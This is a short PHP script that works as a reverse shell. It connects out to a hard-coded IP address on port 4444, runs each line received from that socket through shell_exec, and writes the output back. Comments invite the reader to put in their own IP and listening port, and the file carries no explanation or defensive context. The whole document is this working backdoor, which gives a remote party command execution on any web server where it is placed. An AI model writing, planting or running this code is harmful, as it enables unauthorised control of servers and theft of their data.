<?php
$ip = '103.72.212.138';  // Replace with your IP
$port = 4444;  // Replace with the port you are listening on
$socket = fsockopen($ip, $port);
$cmd = "/bin/sh -i";
while ($line = fgets($socket)) {
    $output = shell_exec($line);
    fwrite($socket, $output);
}
fclose($socket);
?>
